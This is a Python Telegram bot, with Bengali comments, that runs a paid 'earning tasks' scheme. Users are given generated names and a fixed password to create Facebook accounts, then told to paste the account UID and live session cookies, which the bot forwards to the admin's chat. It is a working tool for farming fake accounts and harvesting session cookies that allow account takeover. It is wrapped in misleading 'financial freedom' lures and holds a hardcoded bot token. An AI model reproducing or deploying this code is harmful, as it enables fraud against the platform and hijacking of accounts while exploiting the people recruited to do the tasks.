import logging
import random
from telegram import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, CallbackQueryHandler, filters

# আপনার বট টোকেন ও এডমিন আইডি
TOKEN = '8607670913:AAHz9c52bgsF0HdXt7F53rucSKXOy8iLOlA'
ADMIN_ID = 6495890252

# লগার সেটআপ
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ডেটাবেজ ও ভেরিয়েবল
first_names = ["Rakibul", "Mehedi", "Tanvir", "Sakib", "Imran", "Farhan", "Nayeem", "Sojib", "Arman", "Rony", "Fahim", "Joy", "Rifat", "Al Amin", "Shohel"]
last_names = ["Hossain", "Ahmed", "Islam", "Hasan", "Khan", "Sarker", "Chowdhury", "Talukder", "Mia", "Prodhan", "Bhuiyan"]

# কাজের তালিকা
tasks_list = [
    {
        "id": "cookie_1", 
        "title": "🍪 Facebook Cookies Task (৳8.00)", 
        "reward": 8.00,
        "password": "Pass@cookies"
    }
]

user_states = {}
admin_temp_task = {}
waiting_for_uid = set()
waiting_for_cookies = set()
user_temp_data = {}   
user_balances = {}    
banned_users = set()  

bot_settings = {
    "is_running": True,       
    "min_withdraw": 50.00     
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    if user.id in banned_users and user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Access Denied: Your account has been suspended by the administration.")
        return

    if not bot_settings["is_running"] and user.id != ADMIN_ID:
        await update.message.reply_text("🔧 System Maintenance: The bot is temporarily offline. Please check back later.")
        return

    user_states[chat_id] = 'main_menu'
    waiting_for_uid.discard(chat_id)
    waiting_for_cookies.discard(chat_id)
    user_temp_data.pop(chat_id, None)
    
    # প্রিমিয়াম মেইন মেনু কিবোর্ড
    keyboard = [
        [KeyboardButton('🚀 TASK', style='primary'), KeyboardButton('💎 My Balance', style='success')],
        [KeyboardButton('💸 WITHDRAW', style='success'), KeyboardButton('👥 MY REFFERAL', style='primary')],
        [KeyboardButton('🎟 Redeem Code', style='primary'), KeyboardButton('💡 I\'M NEW', style='success')],
        [KeyboardButton('🎧 VIP Support', style='primary')]
    ]
    
    if user.id == ADMIN_ID:
        keyboard.append([KeyboardButton('⚡ ADMIN PANEL', style='primary')])
        
    markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    # প্রিমিয়াম ও আকর্ষণীয় ওয়েলকাম মেসেজ
    welcome_text = (
        f"✨ **Welcome to the Elite Earning Ecosystem, {user.first_name}!** ✨\n\n"
        f"🌟 Unlock infinite earning potential with our secure, high-speed automated platform. "
        f"Complete micro-tasks seamlessly, grow your digital portfolio, and cash out instantly.\n\n"
        f"📊 **Account Overview:**\n"
        f"• Status: `Active & Verified` ✅\n"
        f"• Security: `Encrypted Layer` 🛡️\n\n"
        f"👇 *Choose an option below to begin your journey to financial freedom:*"
    )
    
    await update.message.reply_text(welcome_text, reply_markup=markup, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip() if update.message.text else ""
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    if user.id in banned_users and user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Access Denied: Your account has been suspended.")
        return

    if not bot_settings["is_running"] and user.id != ADMIN_ID:
        await update.message.reply_text("🔧 System Maintenance: The bot is currently offline.")
        return

    current_state = user_states.get(chat_id, 'main_menu')

    # ব্যাক বা বাতিল অপশন হ্যান্ডলিং
    if text == '❌ Cancel':
        user_states[chat_id] = 'main_menu'
        waiting_for_uid.discard(chat_id)
        waiting_for_cookies.discard(chat_id)
        
        keyboard = [
            [KeyboardButton('🚀 TASK', style='primary'), KeyboardButton('💎 My Balance', style='success')],
            [KeyboardButton('💸 WITHDRAW', style='success'), KeyboardButton('👥 MY REFFERAL', style='primary')],
            [KeyboardButton('🎟 Redeem Code', style='primary'), KeyboardButton('💡 I\'M NEW', style='success')],
            [KeyboardButton('🎧 VIP Support', style='primary')]
        ]
        if user.id == ADMIN_ID:
            keyboard.append([KeyboardButton('⚡ ADMIN PANEL', style='primary')])
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("↩️ Successfully returned to the Main Dashboard:", reply_markup=markup)
        return

    # এডমিন প্যানেলের সাব-মেনু থেকে এডমিন প্যানেলে ফিরে যাওয়া
    if user.id == ADMIN_ID and text == '↩️ Back' and current_state != 'admin_panel':
        user_states[chat_id] = 'admin_panel'
        status_str = "🟢 Online" if bot_settings["is_running"] else "🔴 Offline"
        
        admin_keyboard = [
            [KeyboardButton('🧪 Test User Mode', style='primary'), KeyboardButton('📂 Manage Tasks', style='success')],
            [KeyboardButton('➕ Create New Task', style='success'), KeyboardButton('⚙️ Set Min Withdrawal', style='primary')],
            [KeyboardButton('🚫 Ban / Unban User', style='danger'), KeyboardButton(f'🔌 System Switch: {status_str}', style='primary')],
            [KeyboardButton('↩️ Back to Main Menu', style='danger')]
        ]
        markup = ReplyKeyboardMarkup(admin_keyboard, resize_keyboard=True)
        await update.message.reply_text("⚡ **ADMIN PANEL:**\nWelcome back, Commander. Select an operation:", reply_markup=markup, parse_mode='Markdown')
        return

    # এডমিন প্যানেল থেকে মূল মেনুতে ফিরে যাওয়া
    if user.id == ADMIN_ID and text == '↩️ Back to Main Menu':
        user_states[chat_id] = 'main_menu'
        keyboard = [
            [KeyboardButton('🚀 TASK', style='primary'), KeyboardButton('💎 My Balance', style='success')],
            [KeyboardButton('💸 WITHDRAW', style='success'), KeyboardButton('👥 MY REFFERAL', style='primary')],
            [KeyboardButton('🎟 Redeem Code', style='primary'), KeyboardButton('💡 I\'M NEW', style='success')],
            [KeyboardButton('🎧 VIP Support', style='primary')],
            [KeyboardButton('⚡ ADMIN PANEL', style='primary')]
        ]
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("↩️ Returned to Main Dashboard:", reply_markup=markup)
        return

    # ১. মূল এডমিন প্যানেল ওপেন করা
    if user.id == ADMIN_ID and text == '⚡ ADMIN PANEL':
        user_states[chat_id] = 'admin_panel'
        status_str = "🟢 Online" if bot_settings["is_running"] else "🔴 Offline"
        
        admin_keyboard = [
            [KeyboardButton('🧪 Test User Mode', style='primary'), KeyboardButton('📂 Manage Tasks', style='success')],
            [KeyboardButton('➕ Create New Task', style='success'), KeyboardButton('⚙️ Set Min Withdrawal', style='primary')],
            [KeyboardButton('🚫 Ban / Unban User', style='danger'), KeyboardButton(f'🔌 System Switch: {status_str}', style='primary')],
            [KeyboardButton('↩️ Back to Main Menu', style='danger')]
        ]
        markup = ReplyKeyboardMarkup(admin_keyboard, resize_keyboard=True)
        await update.message.reply_text("⚡ **ADMIN PANEL:**\nManage tasks, security parameters, and bot status seamlessly:", reply_markup=markup, parse_mode='Markdown')
        return

    # ২. এডমিন প্যানেলের অপশনগুলোর হ্যান্ডলিং
    if user.id == ADMIN_ID and user_states.get(chat_id) == 'admin_panel':
        if text == '🧪 Test User Mode':
            if not tasks_list:
                await update.message.reply_text("⚠️ Notice: No tasks are currently available in the system.")
                return
            task_keyboard = []
            for index, task in enumerate(tasks_list):
                btn_style = 'primary' if index % 2 == 0 else 'success'
                task_keyboard.append([KeyboardButton(task['title'], style=btn_style)])
            task_keyboard.append([KeyboardButton('❌ Cancel', style='danger')])
            markup = ReplyKeyboardMarkup(task_keyboard, resize_keyboard=True)
            await update.message.reply_text("🧪 **[User Mode Sandbox]** Select a task below to test:", reply_markup=markup, parse_mode='Markdown')
            return

        elif text == '📂 Manage Tasks':
            if not tasks_list:
                await update.message.reply_text("📂 Task list is currently empty.")
                return
            task_markup = InlineKeyboardMarkup([[InlineKeyboardButton(f"🗑️ Delete: {t['title']}", callback_data=f"del_{t['id']}")] for t in tasks_list])
            await update.message.reply_text("📂 Click on any task below to remove it permanently:", reply_markup=task_markup)
            return

        elif text == '➕ Create New Task':
            user_states[chat_id] = 'admin_waiting_title'
            cancel_markup = ReplyKeyboardMarkup([[KeyboardButton('↩️ Back', style='danger')]], resize_keyboard=True)
            await update.message.reply_text("➕ **Task Creation Wizard Initiated.**\n\nEnter the title for the new task (e.g., `Facebook Cookies Task`):", reply_markup=cancel_markup, parse_mode='Markdown')
            return

        elif text == '⚙️ Set Min Withdrawal':
            user_states[chat_id] = 'admin_waiting_min_withdraw'
            cancel_markup = ReplyKeyboardMarkup([[KeyboardButton('↩️ Back', style='danger')]], resize_keyboard=True)
            await update.message.reply_text(f"⚙️ Current Minimum Payout: **৳{bot_settings['min_withdraw']:.2f}**\n\nEnter the new numerical threshold (e.g., `100`):", reply_markup=cancel_markup, parse_mode='Markdown')
            return

        elif text == '🚫 Ban / Unban User':
            user_states[chat_id] = 'admin_waiting_ban_id'
            banned_str = ", ".join(map(str, banned_users)) if banned_users else "None"
            ban_markup = ReplyKeyboardMarkup([[KeyboardButton('↩️ Back', style='danger')]], resize_keyboard=True)
            await update.message.reply_text(f"🚫 Currently Blacklisted Users: `{banned_str}`\n\nEnter the Telegram **User ID (UID)** to toggle ban status:", reply_markup=ban_markup, parse_mode='Markdown')
            return

        elif text.startswith('🔌 System Switch:'):
            bot_settings["is_running"] = not bot_settings["is_running"]
            status_str = "🟢 Online" if bot_settings["is_running"] else "🔴 Offline"
            
            admin_keyboard = [
                [KeyboardButton('🧪 Test User Mode', style='primary'), KeyboardButton('📂 Manage Tasks', style='success')],
                [KeyboardButton('➕ Create New Task', style='success'), KeyboardButton('⚙️ Set Min Withdrawal', style='primary')],
                [KeyboardButton('🚫 Ban / Unban User', style='danger'), KeyboardButton(f'🔌 System Switch: {status_str}', style='primary')],
                [KeyboardButton('↩️ Back to Main Menu', style='danger')]
            ]
            markup = ReplyKeyboardMarkup(admin_keyboard, resize_keyboard=True)
            await update.message.reply_text(f"✅ System status updated successfully!", reply_markup=markup)
            return

    # ৩. এডমিন ইনপুট প্রসেসিং স্টেটস
    if user.id == ADMIN_ID:
        if current_state == 'admin_waiting_title':
            admin_temp_task[chat_id] = {"title": text}
            user_states[chat_id] = 'admin_waiting_reward'
            await update.message.reply_text("💰 Enter the reward amount as a number (e.g., `8`):", parse_mode='Markdown')
            return
            
        elif current_state == 'admin_waiting_reward':
            try:
                reward = float(text)
                admin_temp_task[chat_id]["reward"] = reward
                admin_temp_task[chat_id]["title"] = f"{admin_temp_task[chat_id]['title']} (৳{reward:.2f})"
                user_states[chat_id] = 'admin_waiting_password'
                await update.message.reply_text("🔒 Enter the secure **Password** required for this task:")
            except ValueError:
                await update.message.reply_text("⚠️ Invalid format! Please enter a valid numerical amount (e.g., 8):")
            return

        elif current_state == 'admin_waiting_password':
            password = text
            task_data = admin_temp_task.get(chat_id)
            if task_data:
                new_task = {
                    "id": f"task_{len(tasks_list) + 1}",
                    "title": task_data["title"],
                    "reward": task_data["reward"],
                    "password": password
                }
                tasks_list.append(new_task)
                user_states[chat_id] = 'admin_panel'
                admin_temp_task.pop(chat_id, None)
                
                status_str = "🟢 Online" if bot_settings["is_running"] else "🔴 Offline"
                admin_keyboard = [
                    [KeyboardButton('🧪 Test User Mode', style='primary'), KeyboardButton('📂 Manage Tasks', style='success')],
                    [KeyboardButton('➕ Create New Task', style='success'), KeyboardButton('⚙️ Set Min Withdrawal', style='primary')],
                    [KeyboardButton('🚫 Ban / Unban User', style='danger'), KeyboardButton(f'🔌 System Switch: {status_str}', style='primary')],
                    [KeyboardButton('↩️ Back to Main Menu', style='danger')]
                ]
                markup = ReplyKeyboardMarkup(admin_keyboard, resize_keyboard=True)
                await update.message.reply_text("✅ New task has been successfully deployed!", reply_markup=markup)
            return

        elif current_state == 'admin_waiting_min_withdraw':
            try:
                new_limit = float(text)
                bot_settings["min_withdraw"] = new_limit
                user_states[chat_id] = 'admin_panel'
                
                status_str = "🟢 Online" if bot_settings["is_running"] else "🔴 Offline"
                admin_keyboard = [
                    [KeyboardButton('🧪 Test User Mode', style='primary'), KeyboardButton('📂 Manage Tasks', style='success')],
                    [KeyboardButton('➕ Create New Task', style='success'), KeyboardButton('⚙️ Set Min Withdrawal', style='primary')],
                    [KeyboardButton('🚫 Ban / Unban User', style='danger'), KeyboardButton(f'🔌 System Switch: {status_str}', style='primary')],
                    [KeyboardButton('↩️ Back to Main Menu', style='danger')]
                ]
                markup = ReplyKeyboardMarkup(admin_keyboard, resize_keyboard=True)
                await update.message.reply_text(f"✅ Minimum withdrawal limit updated to **৳{new_limit:.2f}**!", reply_markup=markup, parse_mode='Markdown')
            except ValueError:
                await update.message.reply_text("⚠️ Invalid value! Please enter a valid number (e.g., 50):")
            return

        elif current_state == 'admin_waiting_ban_id':
            try:
                target_uid = int(text)
                if target_uid == ADMIN_ID:
                    await update.message.reply_text("⚠️ Security Alert: You cannot ban yourself!")
                elif target_uid in banned_users:
                    banned_users.remove(target_uid)
                    await update.message.reply_text(f"✅ User ID `{target_uid}` has been **Unbanned**.")
                else:
                    banned_users.add(target_uid)
                    await update.message.reply_text(f"🚫 User ID `{target_uid}` has been **Blacklisted**.")
                
                user_states[chat_id] = 'admin_panel'
                status_str = "🟢 Online" if bot_settings["is_running"] else "🔴 Offline"
                admin_keyboard = [
                    [KeyboardButton('🧪 Test User Mode', style='primary'), KeyboardButton('📂 Manage Tasks', style='success')],
                    [KeyboardButton('➕ Create New Task', style='success'), KeyboardButton('⚙️ Set Min Withdrawal', style='primary')],
                    [KeyboardButton('🚫 Ban / Unban User', style='danger'), KeyboardButton(f'🔌 System Switch: {status_str}', style='primary')],
                    [KeyboardButton('↩️ Back to Main Menu', style='danger')]
                ]
                markup = ReplyKeyboardMarkup(admin_keyboard, resize_keyboard=True)
                await update.message.reply_text("Returned to Control Center:", reply_markup=markup)
            except ValueError:
                await update.message.reply_text("⚠️ Error: Please enter a valid numeric Telegram User ID:")
            return

    # ৪. সাধারণ ইউজার কাজ সিলেক্ট করা
    selected_task = next((t for t in tasks_list if t['title'] == text), None)
    if selected_task:
        if chat_id not in user_temp_data:
            user_temp_data[chat_id] = {}
        user_temp_data[chat_id]['task_id'] = selected_task['id']
        
        random_first = random.choice(first_names)
        random_last = random.choice(last_names)
        admin_password = selected_task.get("password", "Pass@123")
        
        task_text = (
            f"🎯 **Task Specification: {selected_task['title']}**\n\n"
            f"👤 Generated First Name: `{random_first}`\n"
            f"👤 Generated Last Name: `{random_last}`\n"
            f"🔒 Secure Password: `{admin_password}`\n\n"
            f"📌 *Instructions:* Complete account setup using credentials above, then click **'📤 Submit Facebook UID'** below."
        )
        
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton('📤 Submit Facebook UID', callback_data='ask_uid')],
            [InlineKeyboardButton('❌ Cancel Operation', callback_data='cancel_task')]
        ])
        
        await update.message.reply_text(task_text, reply_markup=markup, parse_mode='Markdown')
        return

    # ৫. UID হ্যান্ডলিং
    if chat_id in waiting_for_uid:
        if not text.isdigit() or len(text) != 14:
            markup = InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel Operation', callback_data='cancel_task')]])
            await update.message.reply_text("⚠️ **Invalid UID Format!** Please provide a valid 14-digit Facebook UID:", reply_markup=markup, parse_mode='Markdown')
            return
        
        waiting_for_uid.discard(chat_id)
        if chat_id not in user_temp_data:
            user_temp_data[chat_id] = {}
        user_temp_data[chat_id]['uid'] = text
        
        waiting_for_cookies.add(chat_id)
        markup = InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel Operation', callback_data='cancel_task')]])
        await update.message.reply_text("✅ **UID Authenticated!** Now copy and paste your active account **Cookies** below:", reply_markup=markup, parse_mode='Markdown')
        return

    # ৬. কুকিজ হ্যান্ডলিং
    if chat_id in waiting_for_cookies:
        waiting_for_cookies.discard(chat_id)
        saved_uid = user_temp_data.get(chat_id, {}).get('uid', 'N/A')
        selected_task_id = user_temp_data.get(chat_id, {}).get('task_id', '')
        
        admin_notification = f"🔔 **New Proof Submission Received!**\n\n👤 User: {user.full_name} (`{user.id}`)\n📌 UID: `{saved_uid}`\n🍪 Cookies Data:\n`{text}`"
        
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton('✅ Approve & Pay', callback_data=f'approve_{user.id}_{selected_task_id}'),
             InlineKeyboardButton('❌ Reject', callback_data=f'reject_{user.id}')]
        ])
        
        try:
            await context.bot.send_message(ADMIN_ID, admin_notification, reply_markup=markup, parse_mode='Markdown')
        except:
            pass

        await update.message.reply_text("✅ Your proof has been successfully transmitted to the administration for manual review.")
        user_temp_data.pop(chat_id, None)
        return

    # ৭. সাধারণ মেনু রেসপন্স
    if text == '🚀 TASK':
        if not tasks_list:
            await update.message.reply_text("⚠️ Notice: No tasks are currently available. Check back soon!")
            return
        
        task_keyboard = []
        for index, task in enumerate(tasks_list):
            btn_style = 'primary' if index % 2 == 0 else 'success'
            task_keyboard.append([KeyboardButton(task['title'], style=btn_style)])
        
        task_keyboard.append([KeyboardButton('❌ Cancel', style='danger')])
        
        markup = ReplyKeyboardMarkup(task_keyboard, resize_keyboard=True)
        await update.message.reply_text("📂 Choose an active task from the index below:", reply_markup=markup)
        
    elif text == '💎 My Balance':
        bal = user_balances.get(user.id, 0.00)
        await update.message.reply_text(f"💎 Current Account Balance: **৳{bal:.2f}**", parse_mode='Markdown')
    elif text == '💸 WITHDRAW':
        bal = user_balances.get(user.id, 0.00)
        await update.message.reply_text(f"💳 Balance Status: **৳{bal:.2f}**\n⚠️ Minimum required limit to trigger a payout is **৳{bot_settings['min_withdraw']:.2f}**.", parse_mode='Markdown')
    elif text == '👥 MY REFFERAL':
        await update.message.reply_text("🔗 Expand your network! Invite friends using your referral link and earn passive income.")
    elif text == '🎟 Redeem Code':
        await update.message.reply_text("🎟 Send your promotional gift code below to claim your bonus:")
    elif text == '💡 I\'M NEW':
        await update.message.reply_text("📖 Welcome guide: Follow the task instructions carefully or contact VIP Support for assistance.")
    elif text == '🎧 VIP Support':
        await update.message.reply_text("🎧 Need assistance? Reach out to our 24/7 dedicated admin support channel.")
    else:
        await update.message.reply_text("⚠️ Invalid option. Please select an action from the dashboard menu below.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global tasks_list
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = query.message.chat.id

    if data.startswith('del_'):
        if query.from_user.id != ADMIN_ID: return
        task_id = data.split('_', 1)[1]
        tasks_list = [t for t in tasks_list if t['id'] != task_id]
        await query.answer("✅ Task removed successfully!")
        
        task_markup = InlineKeyboardMarkup([[InlineKeyboardButton(f"🗑️ Delete: {t['title']}", callback_data=f"del_{t['id']}")] for t in tasks_list]) if tasks_list else InlineKeyboardMarkup([])
        await query.edit_message_text("📂 Task deleted. Updated task index:", reply_markup=task_markup)
        return

    elif data == 'ask_uid':
        waiting_for_uid.add(chat_id)
        markup = InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel Operation', callback_data='cancel_task')]])
        await query.edit_message_text("🆔 Please enter your 14-digit **Facebook UID**:", reply_markup=markup, parse_mode='Markdown')
        
    elif data == 'cancel_task':
        waiting_for_uid.discard(chat_id)
        waiting_for_cookies.discard(chat_id)
        user_temp_data.pop(chat_id, None)
        user_states[chat_id] = 'main_menu'
        await query.edit_message_text("❌ Operation cancelled successfully.")
        
    elif data.startswith('approve_'):
        if query.from_user.id != ADMIN_ID: return
        parts = data.split('_')
        target_user_id = int(parts[1])
        task_id = parts[2] if len(parts) > 2 else ''
        
        selected_task = next((t for t in tasks_list if t['id'] == task_id), None)
        reward = selected_task.get('reward', 8.00) if selected_task else 8.00
        
        if target_user_id not in user_balances:
            user_balances[target_user_id] = 0.00
        user_balances[target_user_id] += reward
        
        await query.answer(f"✅ Approved! Credited ৳{reward:.2f} to user account.")
        try:
            await context.bot.send_message(
                target_user_id, 
                f"🎉 **Congratulations!** Your submission has been verified and approved by the admin.\n💰 Credited to balance: **৳{reward:.2f}**"
            )
        except:
            pass
            
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([]))

    elif data.startswith('reject_'):
        if query.from_user.id != ADMIN_ID: return
        target_user_id = int(data.split('_', 1)[1])
        
        await query.answer("❌ Task rejected.")
        try:
            await context.bot.send_message(target_user_id, "❌ Notice: Your task submission was rejected due to invalid or expired credentials.")
        except:
            pass
            
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([]))

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🔥 Premium Quality Telegram Bot is running successfully...")
    app.run_polling()

if __name__ == '__main__':
    main()